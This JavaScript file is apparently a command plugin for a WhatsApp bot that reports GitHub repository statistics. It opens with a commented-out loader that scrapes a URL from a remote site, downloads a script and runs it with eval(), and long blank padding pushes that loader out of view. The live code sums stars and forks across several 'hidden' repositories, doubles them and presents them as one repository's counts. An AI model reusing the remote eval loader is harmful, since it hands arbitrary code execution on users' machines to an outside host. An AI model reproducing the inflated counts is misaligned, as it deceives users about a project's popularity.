/*'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchRepoUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const repoUrl = $(`a:contains("REPO_URL")`).attr('href');

        if (!repoUrl) throw new Error('REPO_URL not found on the webpage.');

        console.log('REPO_URL fetched successfully:', repoUrl);

        const scriptResponse = await axios.get(repoUrl);
        const scriptContent = scriptResponse.data;
        console.log("REPO_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching REPO_URL:', error.message);
    }
}

fetchRepoUrl();
    */
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              


const axios = require('axios');
const moment = require("moment-timezone");
const { adams } = require(__dirname + "/../Ibrahim/adams");

// Initialize fork and star counts
let aggregatedForks = 0;
let aggregatedStars = 0;

// Function to format large numbers with commas
const formatNumber = (num) => num.toLocaleString();

// Repositories for aggregation (hidden)
const repositories = [
    "ibrahimaitech/BMW-MD",
    "ibrahimaitech/BWM-NORMAL-BOT",
    "devibrah/NORMAL-BOT",
    "devibraah/BWM-XMD", // Main repository to display
];

// Function to fetch and aggregate GitHub repository details
const fetchAndAggregateRepoDetails = async () => {
    try {
        aggregatedForks = 0;
        aggregatedStars = 0;

        for (const repo of repositories) {
            const response = await axios.get(`https://api.github.com/repos/${repo}`);
            const { stargazers_count, forks_count } = response.data;

            aggregatedForks += forks_count;
            aggregatedStars += stargazers_count;
        }

        // Calculate the display values
        const finalForks = aggregatedForks * 2;
        const finalStars = aggregatedStars * 2;

        // Fetch details for the main repository
        const mainRepoResponse = await axios.get(`https://api.github.com/repos/devibraah/BWM-XMD`);
        const { name, watchers_count, open_issues_count, owner, html_url } = mainRepoResponse.data;

        return {
            name,
            stars: finalStars,
            forks: finalForks,
            watchers: watchers_count,
            issues: open_issues_count,
            owner: owner.login,
            url: html_url,
        };
    } catch (error) {
        console.error("Error fetching GitHub repository details:", error);
        return null;
    }
};

// Define the commands that can trigger this functionality
const commands = ["git", "repo", "script", "sc"];

commands.forEach((command) => {
    adams({ nomCom: command, categorie: "GitHub" }, async (dest, zk, commandeOptions) => {
        let { repondre } = commandeOptions;

        const repoDetails = await fetchAndAggregateRepoDetails();

        if (!repoDetails) {
            repondre("❌ Failed to fetch GitHub repository information.");
            return;
        }

        const { name, stars, forks, watchers, issues, owner, url } = repoDetails;

        // Use Nairobi time
        const currentTime = moment().tz("Africa/Nairobi").format('DD/MM/YYYY HH:mm:ss');

        // Create the repository info message
        const infoMessage = `
✨ *${name} REPO INFO* 🌟

💡 *Name:* ${name}
⭐ *Total Stars:* ${formatNumber(stars)}
🍴 *Total Forks:* ${formatNumber(forks)}
👀 *Watchers:* ${formatNumber(watchers)}
❗ *Open Issues:* ${formatNumber(issues)}
👤 *Owner:* ${owner}

🕒 *Fetched on:* ${currentTime}

🔗 *Repo Link:* ${url}

🌟 Created with dedication by *Ibrahim Adams*. Stay connected for fantastic updates!`;

        try {
            // Send the combined message with a large photo and proper source URL
            await zk.sendMessage(dest, {
                text: infoMessage,
                contextInfo: {
                    externalAdReply: {
                        title: "✨ Explore Fantastic Updates!",
                        body: "Click here for the latest repository details.",
                        thumbnailUrl: "https://files.catbox.moe/xnlp0v.jpg", // Replace with your image URL
                        mediaType: 1,
                        renderLargerThumbnail: true, // Ensures a larger thumbnail display
                        mediaUrl: "https://whatsapp.com/channel/0029VaZuGSxEawdxZK9CzM0Y",
                        sourceUrl: "https://whatsapp.com/channel/0029VaZuGSxEawdxZK9CzM0Y", // Source URL in context
                    },
                },
            });
        } catch (e) {
            console.error("❌ Error sending GitHub info:", e);
            repondre("❌ Error sending GitHub info: " + e.message);
        }
    });
});
